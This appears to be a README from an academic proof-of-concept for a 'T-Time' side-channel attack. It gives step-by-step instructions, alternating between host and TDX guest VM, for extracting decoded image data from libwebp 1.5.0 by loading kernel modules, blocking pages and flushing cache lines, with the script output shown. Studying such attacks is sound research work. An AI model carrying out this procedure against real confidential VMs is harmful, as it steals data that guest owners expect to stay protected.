# evaluation webp

In this folder, you will perform an image extraction attack on WebP using the T-Time attack.

(You can refer the video Ttime_webp.mp4 in this folder)

**brief description**

In this experiment, we target libwebp version 1.5.0, attacking the image decoding process to extract image data.

For experimental purposes, we manually compiled all required libraries and header files, and included only the necessary components for the experiment.

mbedtls : [https://github.com/Mbed-TLS/mbedtls/releases/tag/v3.5.2](https://github.com/Mbed-TLS/mbedtls/releases/tag/v3.5.2)

libwebp : [https://github.com/webmproject/libwebp/releases/tag/v1.5.0](https://github.com/webmproject/libwebp/releases/tag/v1.5.0)

The versions of gcc and g++ used during compilation are as follows

```bash
gcc (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

g++ (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

ldd (Ubuntu GLIBC 2.39-0ubuntu8.4) 2.39
Copyright (C) 2024 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

Please note that detailed code explanations is currently under development and is not included in this release.

The explanation will proceed by alternating between the host and TD (VM) perspectives.

1. VM perspective

Navigate to the T-Time_poc_vm/evaluation_webp directory and run the [build.sh](http://build.sh/) script

Then, execute the print_address program. You should see output similar to the following:

```bash
root@tdx-guest:~/VM/T-Time_poc_vm/evaluation_webp# ./print_address
Decoded WebP file: 64x64.webp (Width: 64, Height: 64)
Raw pixel data saved to: test.txt
Matching library:
Backed by:	/root/VM/T-Time_poc_vm/evaluation_webp/library/libwebp.so.7
Range:		0x7ffff7f55000-0x7ffff7fac000
Length:		356352
Offset:		12288
Permissions:	r-xp
Inode:		263731
Device:		fd:01

Code Location VP8ParseIntraModeRow     : vaddr=0x7ffff7f5a000, paddr=0x19409000 [pfn 0x19409]
Code Location VP8DecodeMB              : vaddr=0x7ffff7f5d000, paddr=0x19d47000 [pfn 0x19d47]
Code Location GetCoeffsFast            : vaddr=0x7ffff7f5c000, paddr=0x19e17000 [pfn 0x19e17]
```

Take note of the PFNs displayed in the output

- VP8ParseIntraModeRow: 0x19409
- VP8DecodeMB: 0x19d47
- GetCoeffsFast: 0x19e17

1. Host perspective

Navigate to the T-Time_poc_host/poc/evaluation_webp directory and run the [setting.sh](http://setting.sh/)

When prompted, input the PFNs you previously noted from the virtual machine output:

- VP8ParseIntraModeRow
- VP8DecodeMB
- GetCoeffsFast

```bash
root@tdx:/home/csl/HOST/T-Time/attack/T-Time_poc_host/poc/evaluation_webp# ./setting.sh 
Loading remove.ko from /home/csl/HOST/T-Time/attack/T-Time_poc_host/script/../module/removelist...
Unloading remove...
Loading flushremove.ko from /home/csl/HOST/T-Time/attack/T-Time_poc_host/script/../module/flushremovelist...
Unloading flushremove...
flushremove.ko successfully unloaded.
Enter guest PFN for (VP8ParseIntraModeRow) (e.g., 0x1234): 0x19409
Enter guest PFN for (VP8DecodeMB) (e.g., 0x1234): 0x19d47
Enter guest PFN for (GetCoeffsFast) (e.g., 0x1234): 0x19e17
```

During this process, the cache lines corresponding to the target instruction code are automatically evicted to enable clear inference of the image decoding data.

After completing this step, you will be able to see the block page list and the addresses to flush as shown below.

```bash
---------------------------------------
Loading allprint.ko from /home/csl/HOST/T-Time/attack/T-Time_poc_host/script/../module/printlist...
Unloading allprint...
allprint.ko successfully unloaded.
[ 2770.675110] VM process found: qemu-system-x86 (PID: 2779)
[ 2770.675117] Running woomin_list_print and woomin_flush_list_print...
[ 2770.675119] [woomin_list_print] woomin_list[0][VP8ParseIntraModeRow] = 0x19409 (blocked = 1)
[ 2770.675121] [woomin_list_print] woomin_list[1][VP8DecodeMB] = 0x19d47 (blocked = 1)
[ 2770.675123] [woomin_list_print] woomin_list[2][GetCoeffsFast] = 0x19e17 (blocked = 1)
[ 2770.675124] [woomin_flush_list] woomin_flush list[0] = 0x19d47750 (VA : 0xff116453c7547750)
[ 2770.675126] [woomin_flush_list] woomin_flush list[1] = 0x19d47b00 (VA : 0xff116453c7547b00)
[ 2770.675128] [woomin_flush_list] woomin_flush list[2] = 0x19d47b53 (VA : 0xff116453c7547b53)
[ 2770.675129] [woomin_flush_list] woomin_flush list[3] = 0x19d47de8 (VA : 0xff116453c7547de8)
[ 2770.675130] [woomin_flush_list] woomin_flush list[4] = 0x19d47e05 (VA : 0xff116453c7547e05)
[ 2770.675131] [woomin_flush_list] woomin_flush list[5] = 0x19e17b00 (VA : 0xff116453c7617b00)
[ 2770.675132] [woomin_flush_list] woomin_flush list[6] = 0x19e17b50 (VA : 0xff116453c7617b50)
[ 2770.684599] Exiting TDX Print Module
---------------------------------------

```

1. Host perspective

Navigate to the T-Time_poc_host/poc/evaluation_webp/parse directory and run the capture_threshold.sh script

**Important:** Wait until the following message is displayed:

```bash
execute the target program ! 
```

1. VM perspective

Run the threshold program.

**Important:** Wait until the following message is displayed:

```bash
threshold done!
```

1. Host perspective

Terminate the program by pressing Ctrl + C. Then, run the [threshold.sh](http://threshold.sh/) script

This script automatically determines and sets the threshold required for image reconstruction.

After that, run the [capture.sh](http://captures.sh/) script

**Important:** Wait until the following message is displayed:

```bash
execute the target program ! 
```

1. VM perspective

Decode the Wapiti image by running:

```
decode paper_image/paper_wapiti.webp test.txt
```

**Note:** If you want to decode the Street image instead, pass paper_street.webp as the argument:

**Important:** Wait until the following message is displayed:

```bash
Raw pixel data saved to: test.txt
```

1. Host perspective

Terminate the program by pressing Ctrl + C. Then, run the [reconstruction.sh](http://reconstruction.sh/) script with logfile.txt as the argument:

Once the image reconstruction is complete, you should see the following output:

```bash
Image saved as output_y.png
Image saved as output_y_inverse.png
Image saved as output_yuv.png
Image saved as output_yuv_inverse.png
```

Check the reconstructed images:

- output_y.png: Reconstructed using the Y component.
- output_y_inverse.png: Inverse reconstruction using the Y component.
- output_yuv.png: Reconstructed using the YUV components.
- output_yuv_inverse.png: Inverse reconstruction using the YUV components.